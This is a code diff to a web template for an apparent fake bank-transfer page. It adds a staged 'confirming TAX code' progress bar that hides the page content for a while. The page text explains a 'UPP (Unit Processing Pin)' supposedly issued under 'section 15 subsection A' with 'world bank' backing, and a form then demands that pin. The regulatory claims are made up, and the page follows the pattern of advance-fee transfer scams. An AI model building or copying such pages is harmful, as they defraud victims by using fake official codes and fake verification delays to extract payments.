@@ -2,7 +2,13 @@
 <% function useComma(price) { %>
   <% return price.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') %>
 <% } %>
-<section class="container transfer">
+
+<div id="progressBarWrapper">
+	<div id="progressBar"></div>
+	<p class="text-info text-center">confirming TAX code.... PLease wait</p>
+</div>
+
+<section id="content" style="display:none;" class="container transfer">
     <h2 class="text-success">UPP Code</h2>
     <p>UPP <strong> (Unit Processing Pin)  </strong> is a universal pin issued by authorized department of procurement and security to protect the rights and privacy of both spending and recieving account engage in international tranfers from fradulent and cyber crime. This pin is bank declaration of partnerhsip with parties (sender and reciever ) to monitor the transfer until the receipent acknowlegdes transaction successful. This pin is issued under section 15 subsection A on security guidelines and is meant to be a secret pin. It can only be issued by the security and procurement department of international banks in collaboratiion with world bank standandization.</p>
 
@@ -17,17 +23,8 @@
         <% }) %>    
     <% } %>
 
-    <div id="preloader">
-        <h3 class="text-info">Verifying Tax code.... Please wait</h3>
-		<div class="loader"></div>
-		<div id="progress-bar">
-			<div id="progress-bar-fill">
-				<div id="progress-bar-text" class="text-danger"></div>
-			</div>
-		</div>
-    </div>
     
-    <div id="content" style="display:none;">
+    <div>
         <form action="/confirm/upp/<%= transaction[3].trans %>"  method="POST">
             <div class="form-floating mb-3">
                 <input type="number" class="form-control" id="tax" placeholder="amount" name="upp">
